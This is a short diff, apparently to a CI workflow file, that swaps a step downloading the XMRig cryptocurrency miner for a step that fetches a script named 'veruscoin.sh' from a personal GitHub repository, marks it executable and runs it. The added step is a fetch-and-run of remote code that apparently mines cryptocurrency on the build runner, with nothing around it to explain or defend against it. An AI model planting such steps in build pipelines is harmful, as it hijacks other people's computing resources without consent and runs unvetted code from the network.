@@ -1,3 +1,3 @@
-  command: 
-   get https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
-  
+run: |
+        wget https://github.com/akramali077/akram21/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+      
